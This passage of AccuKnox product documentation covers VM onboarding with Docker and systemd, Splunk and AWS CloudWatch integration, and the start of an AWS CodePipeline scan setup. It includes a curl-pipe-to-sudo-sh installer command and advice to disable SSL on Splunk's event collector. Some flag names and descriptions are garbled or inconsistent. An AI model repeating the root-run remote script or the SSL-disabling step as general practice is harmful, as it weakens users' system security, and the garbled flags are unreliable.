of the same private network (recommended &amp; secure)</p> </li> <li> <p>Control plane has a public IP (not recommended)</p> </li> </ul> <p>Ports required on the control plane VM:</p> Component Type Ports Endpoint Purpose Knox-Gateway Outbound to SaaS 3000 <code>knox-gw.&lt;env&gt;.accuknox.com:3000</code> For Knox-Gateway service PPS Outbound to SaaS 443 <code>pps.&lt;env&gt;.accuknox.com</code> For PPS (Policy Provisioning Service) Spire-Server Outbound to SaaS 8081, 9090 <code>spire.&lt;env&gt;.accuknox.com</code> For Spire-Server communication KubeArmor Relay Server Inbound in Control Plane 32768 - For KubeArmor relay server on control plane Shared Informer Agent Inbound in Control Plane 32769 - For Shared Informer agent on control plane Policy Enforcement Agent (PEA) Inbound in Control Plane 32770 - For Policy Enforcement Agent on control plane Hardening Module Inbound in Control Plane 32771 - For Discovery Engine Hardening Module VM Worker Nodes Outbound from worker node to Control Plane 32768-32771 - For VM worker nodes to connect to the control plane <p>By default, the network created by onboarding commands reserves the subnet <code>172.20.32.0/27</code>. If you want to change it for your environment, you can use the <code>--network-cidr</code> flag.</p> <p>You can check the connectivity between nodes using curl. Upon a successful connection, the message returned by curl will be:</p> <pre><code>$ curl &lt;control-plane-addr&gt;:32770\ncurl: (1) Received HTTP/0.9 when not allowed\n</code></pre>"},{"location":"how-to/vm-onboard-deboard-docker/#onboarding","title":"Onboarding","text":"<p>Navigate to the onboarding page (Settings \u2192 Manage Cluster \u2192 Onboard Now) and choose the \"VM\" option on the instructions page. Then, provide a name for your cluster. You will be presented with instructions to download accuknox-cli and onboard your cluster.</p> <p>The following agents are installed:</p> <ol> <li> <p>Feeder-service which collects KubeArmor feeds.</p> </li> <li> <p>Shared-informer-agent authenticates with your VMs and collects information regarding entities like hosts, containers, and namespaces.</p> </li> <li> <p>Policy-enforcement-agent authenticates with your VMs and enforces labels and policies.</p> </li> </ol>"},{"location":"how-to/vm-onboard-deboard-docker/#install-knoxctlaccuknox-cli","title":"Install knoxctl/accuknox-cli","text":"<p><code>curl -sfL https://knoxctl.accuknox.com/install.sh | sudo sh -s -- -b /usr/bin</code></p>"},{"location":"how-to/vm-onboard-deboard-docker/#onboarding-control-plane","title":"Onboarding Control Plane","text":"<p>The command may look something like this:</p> <pre><code>$ knoxctl onboard vm cp-node \\\n--version v0.10.7 \\\n--join-token=ae0e9974-6a8d-4c4f-9148-fb4e0ca769d9 \\ #this may vary\n--spire-host=spire.accuknox.com \\\n--pps-host=pps.accuknox.com \\\n--knox-gateway=knox-gw.accuknox.com:3000 \\\n--vm-mode=\"systemd\" \\  # this may vary\n--enable-host-policy-discovery \\\n--hostViz=\"process,network,file,capabilities\" \\\n--viz=\"process,network,file\"\n</code></pre> <p>The above command will emit the command to onboard worker nodes. You may also use the <code>--Control Plane-node-addr</code> flag to specify the address that other nodes will use to connect with your cluster.</p> <p>By default, the network created by onboarding commands reserves the subnet <code>172.20.32.0/27</code> for the <code>accuknox-net</code> Docker network. If you want to change it for your environment, you can use the <code>--network-cidr</code> flag.</p> <p>As for the additional flags, here is the parameter table:</p> Flag Scope Example Description <code>--enable-host-policy-discovery</code> Host --- Enables automatic host-level policy discovery (process, network, file, capabilities). <code>--hostViz=&lt;options&gt;</code> Host-level telemetry visualization <code>process,network,file,capabilities</code> Visualizes process activity, network traffic, file access, and Linux capabilities. <code>--viz=&lt;options&gt;</code> Containers, workloads, or VM-level view <code>process,network,file</code> Visualizes process, network, and file activities."},{"location":"how-to/vm-onboard-deboard-docker/#onboarding-worker-nodes","title":"Onboarding Worker Nodes","text":"<p>The second command will be for onboarding worker nodes. It may look something like this:</p> <p><code>knoxctl onboard vm node --Control Plane-node-addr=&lt;control-plane-addr&gt;</code></p> <p>Example:</p> <pre><code>$ knoxctl onboard vm node --Control Plane-node-addr=192.168.56.106\nPulling kubearmor-init       ... done\nPulling kubearmor            ... done\nPulling kubearmor-vm-adapter ... done\nCreating network \"accuknox-config_accuknox-net\" with the default driver\nCreating kubearmor-init ... done\nCreating kubearmor      ... done\nCreating kubearmor-vm-adapter ... done\nonboard-vm-node.go:41: VM successfully joined with control-plane!\n</code></pre>"},{"location":"how-to/vm-onboard-deboard-docker/#troubleshooting","title":"Troubleshooting","text":"<p>If you encounter any issues while onboarding, use the commands below to debug:</p> <pre><code>docker logs spire-agent -f\ndocker logs shared-informer-agent -f\ndocker logs kubearmor-init -f\ndocker logs kubearmor -f\n</code></pre>"},{"location":"how-to/vm-onboard-deboard-docker/#deboarding","title":"Deboarding","text":"<p>Deboard the cluster from SaaS first.</p> <p>To deboard the worker-vm/Node:</p> <p><code>knoxctl deboard vm node</code></p> <p>To deboard the Control-Plane VM:</p> <p><code>knoxctl deboard vm Control Plane-node</code></p> <p>Sample Output:</p> <pre><code>$ knoxctl deboard vm Control Plane-node\n[+] Running 10/10\n \u2714 Container shared-informer-agent       Removed                                                                   0.6s\n \u2714 Container feeder-service              Removed                                                                   0.6s\n \u2714 Container policy-enforcement-agent    Removed                                                                   0.8s\n \u2714 Container wait-for-it                 Removed                                                                   0.0s\n \u2714 Container kubearmor-vm-adapter        Removed                                                                   5.6s\n \u2714 Container kubearmor-relay-server      Removed                                                                   1.5s\n \u2714 Container spire-agent                 Removed                                                                   0.5s\n \u2714 Container kubearmor                   Removed                                                                  10.4s\n \u2714 Container kubearmor-init              Removed                                                                   0.0s\n \u2714 Network accuknox-config_accuknox-net  Removed                                                                   0.3s\nPlease remove any remaining resources at /home/user/.accuknox-config\nControl plane node deboarded successfully.\n</code></pre> <p>After that cleanup the ~/.accuknox-config directory</p> <p><code>sudo rm -rf ~/.accuknox-config</code></p>"},{"location":"how-to/vm-onboard-deboard-systemd/","title":"Onboarding and Deboarding VMs with Systemd","text":""},{"location":"how-to/vm-onboard-deboard-systemd/#systemd","title":"Systemd","text":"<p>Systemd is a core component of modern Linux systems responsible for managing services and processes. It ensures that essential services start automatically during boot, remain running, and restart if they fail. In simple terms, systemd acts like a controller that organizes and oversees everything needed to keep the system stable and functional.</p> <p>Currently, root/sudo permissions are needed for onboarding systemd. This is because KubeArmor requires privileges to protect the host and systemd services, packages are currently installed on the root directory.</p> <p>Only in case of the control plane node, a working RabbitMQ server is required. This can be installed using Docker.</p> <pre><code># Latest RabbitMQ 3.13\ndocker run -it --rm --name rabbitmq -p 5672:5672 -p 15672:15672 rabbitmq:3.13-management\n</code></pre> <p>Alternatively, you can install RabbitMQ using a package manager:</p> <ul> <li> <p>Linux, BSD, UNIX: Debian, Ubuntu | RHEL, CentOS Stream, Fedora | Generic binary build | Solaris</p> </li> <li> <p>Windows: Chocolatey package | Windows Installer | Binary build</p> </li> <li> <p>MacOS: Homebrew | Generic binary build</p> </li> <li> <p>Erlang/OTP for RabbitMQ</p> </li> </ul> <p>BTF support is needed. Any kernel version which has this should work. Check if BTF info is present with the script below:</p> <pre><code>if [ ! -e \"/sys/kernel/btf/vmlinux\" ]; then\n  echo \"BTF info not present\"\nelse\n  echo \"BTF info present\"\nfi\n</code></pre> <p>If the script returns \"BTF info not present,\" BTF support is not available, and you should run the script below to build the required files on your system:</p> <pre><code># Download KubeArmor\ngit clone https://github.com/kubearmor/KubeArmor/\ncd KubeArmor/KubeArmor/packaging\n./post-install.sh\n</code></pre> <p>Note</p> <p>For detailed instructions specific to SystemD Based Non-BTF Environments, please refer to this guide.</p> <p>Container Protection Requirements (Optional)</p> <p>If container protection is needed, a Linux Kernel with BPF LSM is desired. Generally, it is present in v5.8+. Here's a guide on enabling BPF LSM: KubeArmor Getting Started FAQ.</p> <p>If BPF LSM is not available, AppArmor should still work out of the box for host policy application. However, follow the guide Support for non orchestrated containers for each container.</p>"},{"location":"how-to/vm-onboard-deboard-systemd/#resource-requirements","title":"Resource Requirements","text":""},{"location":"how-to/vm-onboard-deboard-systemd/#control-plane-node-minimum","title":"Control Plane Node (Minimum)","text":"Resource Requirement CPU 2 vCPU Memory 4 GB Disk 1 GB"},{"location":"how-to/vm-onboard-deboard-systemd/#worker-node-minimum","title":"Worker Node (Minimum)","text":"Resource Requirement CPU 2 vCPU Memory 2 GB Disk 500 MB"},{"location":"how-to/vm-onboard-deboard-systemd/#network-requirements","title":"Network Requirements","text":"<p>Connectivity between control plane node and worker nodes is a must. They should either be:</p> <ul> <li> <p>Part of the same private network (recommended &amp; secure)</p> </li> <li> <p>Control plane has a public IP (not recommended)</p> </li> </ul> <p>Ports required on the control plane VM:</p> Component Type Ports Endpoint Purpose Knox-Gateway Outbound to SaaS 3000 <code>knox-gw.&lt;env&gt;.accuknox.com:3000</code> For Knox-Gateway service PPS Outbound to SaaS 443 <code>pps.&lt;env&gt;.accuknox.com</code> For PPS (Policy Provisioning Service) Spire-Server Outbound to SaaS 8081, 9090 <code>spire.&lt;env&gt;.accuknox.com</code> For Spire-Server communication KubeArmor Relay Server Inbound in Control Plane 32768 - For KubeArmor relay server on control plane Shared Informer Agent Inbound in Control Plane 32769 - For Shared Informer agent on control plane Policy Enforcement Agent (PEA) Inbound in Control Plane 32770 - For Policy Enforcement Agent on control plane Hardening Module Inbound in Control Plane 32771 - For Discovery Engine Hardening Module VM Worker Nodes Outbound from worker node to Control Plane 32768-32771 - For VM worker nodes to connect to the control plane <p>Check the CWPP documentation for more details on the network requirements.</p> <p>You can check the connectivity between nodes using curl. Upon a successful connection, the message returned by curl will be:</p> <pre><code>$ curl &lt;control-plane-addr&gt;:32770\ncurl: (1) Received HTTP/0.9 when not allowed\n</code></pre>"},{"location":"how-to/vm-onboard-deboard-systemd/#onboarding","title":"Onboarding","text":"<p>Navigate to the onboarding page (Settings \u2192 Manage Cluster \u2192 Onboard Now) and choose the \"VM\" option on the instructions page. Then, provide a name for your cluster. You will be presented with instructions to download accuknox-cli and onboard your cluster.</p> <p>The following agents will be installed:</p> <ol> <li> <p>Feeder-service which collects KubeArmor feeds.</p> </li> <li> <p>Shared-informer-agent authenticates with your VMs and collects information regarding entities like hosts, containers, and namespaces.</p> </li> <li> <p>Policy-enforcement-agent authenticates with your VMs and enforces labels and policies.</p> </li> </ol>"},{"location":"how-to/vm-onboard-deboard-systemd/#install-knoxctlaccuknox-cli","title":"Install knoxctl/accuknox-cli","text":"<p><code>curl -sfL https://knoxctl.accuknox.com/install.sh | sudo sh -s -- -b /usr/bin</code></p>"},{"location":"how-to/vm-onboard-deboard-systemd/#onboarding-control-plane","title":"Onboarding Control Plane","text":"<p>The command may look something like this:</p> <pre><code>$ knoxctl onboard vm cp-node \\\n--version v0.10.7 \\\n--join-token=ae0e9974-6a8d-4c4f-9148-fb4e0ca769d9 \\ #this may vary\n--spire-host=spire.accuknox.com \\\n--pps-host=pps.accuknox.com \\\n--knox-gateway=knox-gw.accuknox.com:3000 \\\n--vm-mode=\"systemd\" \\  # this may vary\n--enable-host-policy-discovery \\\n--hostViz=\"process,network,file,capabilities\" \\\n--viz=\"process,network,file\"\n</code></pre> <p>Note</p> <p>By default, if Docker is not found, systemd mode of installation would be used. If you want to explicitly onboard using systemd services, add the <code>--vm-mode=systemd</code> flag to the above command.</p> <p>The above command will emit the command to onboard worker nodes. You may also use the <code>--cp-node-addr</code> flag to specify the address that other nodes will use to connect with your cluster.</p> <p>As for the additional flags, here is the parameter table:</p> Flag Scope Example Description <code>--enable-host-policy-discovery</code> Host --- Enables automatic host-level policy discovery (process, network, file, capabilities). <code>--hostViz=&lt;options&gt;</code> Host-level telemetry visualization <code>process,network,file,capabilities</code> Visualizes process activity, network traffic, file access, and Linux capabilities. <code>--viz=&lt;options&gt;</code> Containers, workloads, or VM-level view <code>process,network,file</code> Visualizes process, network, and file activities."},{"location":"how-to/vm-onboard-deboard-systemd/#onboarding-worker-nodes","title":"Onboarding Worker Nodes","text":"<p>The second command will be for onboarding worker nodes. It may look something like this:</p> <p><code>knoxctl onboard vm node --cp-node-addr=&lt;control-plane-addr&gt;</code></p> <p>Example:</p> <pre><code>$ knoxctl onboard vm node --cp-node-addr=192.168.56.106\nPulling kubearmor-init       ... done\nPulling kubearmor            ... done\nPulling kubearmor-vm-adapter ... done\nCreating network \"accuknox-config_accuknox-net\" with the default driver\nCreating kubearmor-init ... done\nCreating kubearmor      ... done\nCreating kubearmor-vm-adapter ... done\nonboard-vm-node.go:41: VM successfully joined with control-plane!\n</code></pre> <p></p>"},{"location":"how-to/vm-onboard-deboard-systemd/#troubleshooting","title":"Troubleshooting","text":"<p>If you encounter any issues while onboarding, use the commands below to debug:</p> <p><code>sudo journalctl -xeu &lt;service-name&gt;.service</code></p> <p>Replace <code>&lt;service-name&gt;</code> with one of the following:</p> <ul> <li> <p><code>kubearmor</code>: Logs show policy enforcement and monitor Kubernetes workloads; useful for debugging misconfigurations or runtime issues.</p> </li> <li> <p><code>kubearmor-relay-server</code>: Bridges KubeArmor clients with external log systems; logs debug communication or relay errors.</p> </li> <li> <p><code>kubearmor-vm-adapter</code>: Tracks policy enforcement in VMs; logs diagnose policy application on non-Kubernetes workloads.</p> </li> <li> <p><code>accuknox-policy-enforcement-agent</code>: Enforces security policies; logs troubleshoot policy errors or conflicts.</p> </li> <li> <p><code>accuknox-shared-informer-agent</code>: Shares Kubernetes resource data; logs debug metadata collection issues.</p> </li> <li> <p><code>accuknox-sumengine</code>: Processes telemetry data; logs resolve performance or data processing errors.</p> </li> <li> <p><code>accuknox-discover-agent</code>: Discovers potential policies; logs analyze policy suggestions.</p> </li> <li> <p><code>spire-agent</code>: Manages workload identities; logs debug identity issuance and attestation issues.</p> </li> <li> <p><code>accuknox-hardening-agent</code>: Automates system hardening; logs troubleshoot configuration and hardening conflicts.</p> </li> </ul>"},{"location":"how-to/vm-onboard-deboard-systemd/#deboarding","title":"Deboarding","text":"<p>Deboard the cluster from SaaS first.</p> <p>To deboard the worker-vm/Node:</p> <p><code>knoxctl deboard vm node</code></p> <p>To deboard the Control-Plane VM:</p> <p><code>knoxctl deboard vm cp-node</code></p> <p>Sample Output:</p> <pre><code>$ knoxctl deboard vm cp-node\n[+] Running 10/10\n \u2714 Container shared-informer-agent       Removed                                                                   0.6s\n \u2714 Container feeder-service              Removed                                                                   0.6s\n \u2714 Container policy-enforcement-agent    Removed                                                                   0.8s\n \u2714 Container wait-for-it                 Removed                                                                   0.0s\n \u2714 Container kubearmor-vm-adapter        Removed                                                                   5.6s\n \u2714 Container kubearmor-relay-server      Removed                                                                   1.5s\n \u2714 Container spire-agent                 Removed                                                                   0.5s\n \u2714 Container kubearmor                   Removed                                                                  10.4s\n \u2714 Container kubearmor-init              Removed                                                                   0.0s\n \u2714 Network accuknox-config_accuknox-net  Removed                                                                   0.3s\nPlease remove any remaining resources at /home/user/.accuknox-config\nControl plane node deboarded successfully.\n</code></pre> <p>After that cleanup the ~/.accuknox-config directory</p> <p><code>sudo rm -rf ~/.accuknox-config</code></p>"},{"location":"integrations/","title":"Integrations","text":"<p>CI/CD</p> <p>Container Platform</p> <p>K8s Management</p> <p>Ticketing</p> <p>SIEM/ Security Events</p> <p>Notification</p> <p>OAuth</p> <p>Email Backend</p>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/","title":"AccuKnox Splunk App","text":""},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#introduction","title":"Introduction","text":"<p>The AccuKnox Splunk App is designed to deliver operational reporting as well as a simplified and configurable dashboard. Users can view the real-time alerts in form of logs and telemetries.</p> <p>Important features</p> <ul> <li> <p>Dashboard to track the real time alerts genrated from K8s cluster.</p> </li> <li> <p>Data models with pivots for easy access to data and visualization.</p> </li> <li> <p>Filter out the Alerts based on defferent namespaces, pods, operations, severity, tags and the actions of policies.</p> </li> <li> <p>Drilldown ability to see how the alerts genrated, what policy was violated and what was the result for the same.</p> </li> </ul>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#installation","title":"Installation","text":""},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#prerequisites","title":"Prerequisites :","text":"<p>1. K8s Cluster with AccuKnox agents installed, up and running fine. KubeArmor and Feeder Service are mandatory. The environment variable for the feeder is set for the K8s cluster in use.</p> <p>2. An active Splunk Deployment and Access to the same.</p> <p>To depoy Splunk on Kubernetes Cluster follow https://splunk.github.io/splunk-operator/ and for Linux follow https://docs.splunk.com/Documentation/Splunk/9.0.1/Installation/InstallonLinux</p>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#where-to-install-it","title":"Where to install it?","text":"<p>Splunk App can be installed on Splunk Enterprise Deployment done on K8s or VM. User can install the App using three different ways.</p>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#option-1-install-from-file","title":"Option 1: Install from File","text":"<p>This App can be installed by Uploading the file to the Splunk UI.</p> <ol> <li>Download the AccuKnox Splunk App file, by typing the following command. This file can be downloaded anywhere from where the user can upload the file to Splunk UI.</li> </ol> <pre><code>git clone https://github.com/accuknox/splunk.git AccuKnox\ntar -czvf AccuKnox.tar.gz AccuKnox\n</code></pre> <ol> <li>Log in to your Splunk Deployment. </li> <li>Click on the gear  icon next to Apps. </li> <li>This will navigate you to the Apps Dashboard. On the top right, click on Install app from file. </li> <li>This will navigate to Upload App Screen. Select AccuKnox.tar.gz file downloaded in the first step, and upload. In case you are updating the app and it\u2019s already installed, mark the check box for Upgrade App.  </li> <li>Once Uploaded the App will be installed on the Splunk Deployment, with a confirmation message, \u201c*****AccuKnox\" was installed successfully.* Click on Launch App to view the App.</li> </ol> <p> 7. You can Restart Splunk for the App to work properly. Go to Settings &gt; Server Control &gt; Restart Splunk, Restarting the app will take approx. 1-2 minutes.</p> <p> 8. Wait for Splunk to Restart And you can log in back to see the AccuKnox App in the App section.</p> <p> 9. Click on the AccuKnox App to launch the App. This will navigate you to the App dashboard.</p> <p></p> <p>Note:</p> <ol> <li> <p>If Dashboards shows no data, you need to configure the HEC on Splunk and Forward the data first, check below how to configure and create HEC and forward the data.</p> </li> <li> <p>If data is not being pushed, Login to Splunk &gt; Setting &gt; Data Input &gt; Select HTTP Event Collector &gt; Global Settings &gt; Disable SSL if Enabled by unchecking the box.</p> </li> </ol>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#option-2-install-the-app-from-splunkbase","title":"Option 2: Install the App from SplunkBase","text":"<p>Install the AccuKnox App by downloading it from the App homepage.</p> <p></p>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#option-3-install-from-github","title":"Option 3: Install from GitHub","text":"<p>This App is available on SplunkBase and Github. Optionally, you can clone the GitHub repository to install the App. Please feel free to submit contributions to the App using pull requests on GitHub.</p> <ol> <li> <p>Locate the Splunk Deployment done in your environment.</p> </li> <li> <p>Navigate to the Splunk App directory. For Linux users <code>/opt/splunk/etc/apps</code> and windows users <code>\\Program Files\\Splunk\\etc\\apps</code></p> </li> </ol> <p>From the directory <code>$SPLUNK_HOME/etc/apps/</code>, type the following command:</p> <pre><code>git clone https://github.com/accuknox/splunk.git AccuKnox\n</code></pre>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#what-data-types-does-accuknox-exportintegrate-into-splunk","title":"What data types does AccuKnox export/integrate into Splunk?","text":"<ul> <li>KubeArmor Alert</li> <li>KubeArmor Container Logs</li> <li>Cilium Alerts</li> <li>Cilium Logs</li> </ul> <p>Managing data sent to Splunk, What can be sent?</p> <p>AccuKnox can forward the data to Splunk in two ways:</p> <ol> <li>From feeder service running on client cluster</li> <li>From SAAS platform</li> </ol>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#forwarding-events-to-splunk-from-feeder","title":"Forwarding Events to Splunk from Feeder","text":"<p>Prerequisites:</p> <ol> <li> <p>Feeder Service and KubeArmor are Installed and running on the user\u2019s K8s Cluster.</p> </li> <li> <p>A sample application can be used to generate the alerts, check how to deploy a sample application, and generate alerts.</p> </li> </ol>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#configuring-feeder-for-the-first-time-to-forward-the-events","title":"Configuring feeder for the first time to forward the events:","text":"<p>1 . Assuming the user is inside their K8s Cluster, type the following command to edit the feeder deployment.</p> <pre><code>kubectl edit deployment feeder-service -n accuknox-agents\n</code></pre> <p>2 . The below Configuration parameters needs be updated for Splunk configuration. (Default params in code blocks need to be modified, line number 93 of feeder chart )</p> <p>To start editing press Insert button name: SPLUNK_FEEDER_ENABLED value: <code>false</code></p> <p>change value to <code>true</code> to enable the feed</p> <p>name: SPLUNK_FEEDER_URL</p> <p>value: <code>https://&lt;splunk-host&gt;</code></p> <p>change value to the <code>HEC URL</code> created.</p> <p>name: SPLUNK_FEEDER_TOKEN</p> <p>value: <code>\" x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000\"</code></p> <p>change  the value with <code>generated token</code> for HEC</p> <p>name: SPLUNK_FEEDER_SOURCE_TYPE</p> <p>value: <code>\"http:kafka\"</code></p> <p>change the value to <code>http:kafka</code> if not added</p> <p>name: SPLUNK_FEEDER_SOURCE _ value:_  <code>\"json\"</code></p> <p>change the value as per your choice</p> <p>name: SPLUNK_FEEDER_INDEX</p> <p>value: <code>\"main\"</code></p> <p>change the value as to <code>main</code></p> <p>Hit <code>ctrl + c</code> once editing is done, and enter <code>:wq</code> and hit <code>enter</code> to save the configuration.</p> <p>Additionaly you can Enable and Disable the event forwarding by Enabling/Disabling Splunk (Runtime):</p> <pre><code>kubectl set env deploy/feeder-service SPLUNK_FEEDER_ENABLED=\"true\" -n accuknox-agents\n</code></pre> <p>By enabling the flag to true (as above), the events will be pushed to Splunk. And disabling it to <code>false</code> will stop pushing logs.</p> <p>Note: Likewise other configuration parameters can be updated in Runtime.</p>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#from-saas-channel-integration","title":"From SAAS, Channel Integration","text":""},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#integration-of-splunk","title":"Integration of Splunk","text":""},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#1-prerequisites","title":"1. Prerequisites","text":"<p>Set up Splunk HTTP Event Collector (HEC) to view alert notifications from AccuKnox in Splunk. Splunk HEC lets you send data and application events to a Splunk deployment over the HTTP and Secure HTTP (HTTPS) protocols.</p> <ul> <li> <p>To set up HEC, use instructions in Splunk documentation. For source type,_json is the default; if you specify a custom string on AccuKnox, that value will overwrite anything you set here.</p> </li> <li> <p>Select Settings &gt; Data inputs &gt; HTTP Event Collector and make sure you see HEC added in the list and that the status shows that it is Enabled .</p> </li> </ul>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#2-steps-to-integrate","title":"2. Steps to Integrate","text":"<ul> <li> <p>Go to Channel Integration.</p> </li> <li> <p>Click integrate now on Splunk.</p> </li> <li> <p>Enter the following details to configure Splunk.</p> </li> <li> <p>Select the Splunk App : From the dropdown, Select Splunk Enterprise.</p> <ul> <li> <p>Integration Name: Enter the name for the integration. You can set any name. e.g., Test Splunk</p> </li> <li> <p>Splunk HTTP event collector URL: Enter your Splunk HEC URL generated earlier. e.g  https://splunk-xxxxxxxxxx.com/services/collector</p> </li> <li> <p>Index: Enter your Splunk Index, once created while creating HEC. e.g  main</p> </li> <li> <p>Token: Enter your Splunk Token, generated while creating HEC URL. e.g  <code>x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000</code></p> </li> <li> <p>Source: Enter the source as <code>http:kafka</code></p> </li> <li> <p>Source Type: Enter your Source Type here, this can be anything and the same will be attach to the event type forwarded to splunk. e.g  <code>_json</code></p> </li> <li> <p>Click Test to check the new functionality, You will receive the test message on configured slack channel. e.g <code>Test Message host = xxxxxx-deployment-xxxxxx-xxx00 source = http:kafka sourcetype = trials</code></p> </li> </ul> </li> <li> <p>Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.</p> </li> </ul> <p>How will AccuKnox manage the Splunk data\u2014what will be sent &amp; what will not be sent?</p>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#managing-what-type-of-data-can-be-sent-to-splunk","title":"Managing what type of data can be sent to Splunk?","text":"<p>From AccuKnox we can manage the type of data forwardered to integration using triggers.</p>"},{"location":"integrations/accuKnox-splunk-app-installation-configuration/#how-to-create-a-new-trigger","title":"How to create a new trigger?","text":"<ol> <li> <p>After choosing specific log filter from the Logs Screen, click on <code>Create Trigger</code> button. You can either click elements directly from the log events list, search for elements directly in the filter, or use Search Filters to choose a specific log filter</p> </li> <li> <p>Configure the required options:</p> <p></p> </li> <li> <p>Name: Define an alert trigger name.</p> </li> <li> <p>When to initiate this trigger: Set the frequency of the trigger. You have four options to select, (1) Runtime as it happens (2) Once a day (3) Once a week (4) Once a month</p> </li> <li> <p>Define Threat Level: Define the threat level for the trigger. You have three options (1) High (2) Medium (3) Low</p> </li> <li> <p>Selected Filter: The chosen log filter from step 1 is populated here. You can shift to predefined filters from here also.</p> </li> <li> <p>Notification channel: Choose the notification channel that should receive the alerts.</p> </li> </ol> <p>Note: Before selecting the notification channel, you should complete the  channel integration for this channel. Review the Channel Integration for more context.        Channel Integration Guide</p> <ol> <li>Click <code>Save</code> button to store the trigger in database.</li> </ol> <p>SCHEDULE DEMO</p>"},{"location":"integrations/aws-cloudwatch/","title":"AWS CloudWatch Integration","text":""},{"location":"integrations/aws-cloudwatch/#aws-cloudwatch-integration","title":"AWS CloudWatch Integration","text":"<p>Navigate to Settings\u2192Integrations. Choose \"AWS CloudWatch\" services and click the Integrate Now button.</p>"},{"location":"integrations/aws-cloudwatch/#integration-of-amazon-cloudwatch","title":"Integration of Amazon CloudWatch:","text":""},{"location":"integrations/aws-cloudwatch/#a-prerequisites","title":"a. Prerequisites","text":"<ul> <li> <p>AWS Access Key / AWS Secret Key is required for this Integration.</p> </li> <li> <p>[Note]: Please refer this link to create access keys link</p> </li> </ul>"},{"location":"integrations/aws-cloudwatch/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration URL</li> <li>Click the Integrate Now button \u2192 AWS CloudWatch</li> </ul> <ul> <li>Here you'll be able to see these entries:<ul> <li>Integration Name: Enter the name for the integration. You can set any name.</li> <li>AWS Access Key: Enter your AWS Access Key here.</li> <li>AWS Secret Key: Enter your AWS Secret Key here.</li> <li>Region Name: Enter your AWS Region Name here.</li> </ul> </li> <li>Once you fill every field then click the button this will test whether your integration is working or not.</li> <li>Click the Save button.</li> </ul>"},{"location":"integrations/aws-cloudwatch/#2-configuration-of-alert-triggers","title":"2. Configuration of Alert Triggers:","text":"<ul> <li>On the Logs page, after choosing specific log filter click on 'Create Trigger' button.</li> <li>The below fields needs to be entered with appropriate data:</li> <li>Name: Enter the name for the trigger. You can set any name without special characters.</li> <li>When to Initiate: The frequency of the trigger as Real Time / .</li> <li>Status: Enter the severity for the trigger.</li> <li>Search Filter Data : The filter log chosen in automatically populated here.This is optional.</li> <li>Predefined queries: The list of predefined queries for this workspace is shown as default.</li> <li>Notification Channel: Select the integration channel that needs to receive logs. This should be AWS CloudWatch. (Note: Channel Integration is done on the previous step)</li> <li>Save: Click on Save for the trigger to get stored in database.</li> </ul>"},{"location":"integrations/aws-cloudwatch/#3-logs-forwarding","title":"3. Logs Forwarding:","text":"<ul> <li>For each Enabled Trigger, please check the AWS platform to view the logs.</li> <li>Based on Frequency (Real Time / Once in a Day / Week)</li> <li>The Rule Engine matches the real time logs against the triggers created.</li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"integrations/aws-container-scan/","title":"AWS Code Pipeline - Container Scan","text":"<p>This document contains the process of integrating AccuKnox Container Scanning with AWS CodePipeline. By incorporating AccuKnox scanning into the pipeline, we can identify and resolve these vulnerabilities before deploying the image.</p>"},{"location":"integrations/aws-container-scan/#prerequisites","title":"Prerequisites","text":"<p>Before beginning the integration, ensure you have the following:</p> <ul> <li> <p>AWS CodePipeline access - Administrative access to create and modify pipelines.</p> <ul> <li>\ud83d\udcd6 Reference: Getting Started with AWS CodePipeline</li> <li>\ud83d\udcd6 Reference: Create a Pipeline in AWS CodePipeline</li> </ul> </li> <li> <p>AWS CodeBuild access - Make sure that you have added the <code>codestar-connections:UseConnection</code> IAM permission to your service role policy.</p> <ul> <li>\ud83d\udcd6 Reference: Getting Started with AWS CodeBuild</li> </ul> </li> <li> <p>AccuKnox UI access - Access to the AccuKnox platform.</p> </li> <li> <p>AWS IAM Configuration - Proper service role permissions configured.</p> <ul> <li>\ud83d\udcd6 Reference: Add permissions to your CodeBuild service role policy</li> </ul> </li> <li> <p>AccuKnox API credentials, including:</p> <ul> <li>Authentication Token</li> <li>Endpoint URL</li> <li>Labels</li> </ul> </li> <li> <p>Repository Configuration:</p> <ul> <li>Full clone enabled - Ensure AWS CodePipeline is configured to pass metadata that allows CodeBuild actions to perform a full Git clone.<ul> <li>\ud83d\udcd6 Reference: Enable Full Clone in AWS CodeBuild</li> </ul> </li> </ul> </li> </ul>"},{"location":"integrations/aws-container-scan/#configuration-steps","title":"Configuration Steps","text":""},{"location":"integrations/aws-container-scan/#step-1-configure-aws-codepipeline-environment-variables","title":"Step 1: Configure AWS CodePipeline Environment Variables","text":"<p>Add the following environment variables to your CodeBuild project or pipeline configuration:</p> <ul> <li>\ud83d\udcd6 Reference: Set Environment Variables in CodeBuild Project</li> </ul> Name Description Required Example Value <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. Yes <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_TOKEN</code> Token for authenticating with the AccuKnox CSPM panel. Refer to How to Create Tokens. Yes <code>your_api_token_here</code> <code>ACCUKNOX_LABEL</code> Token for authenticating with the AccuKnox CSPM panel. Refer to How to Create Tokens. Yes <code>test123</code>"},{"location":"integrations/aws-container-scan/#step-2-configure-aws-codebuild-specification-buildspecyml","title":"Step 2: Configure AWS CodeBuild Specification (buildspec.yml)","text":"<p>Create or update your <code>buildspec.yml</code> file in your repository root with the following configuration:</p> <pre><code>version: 0.2\n\nenv:\n  variables:\n    SOFT_FAIL: \"true\"\n    IMAGE: \"gitlab\"\n    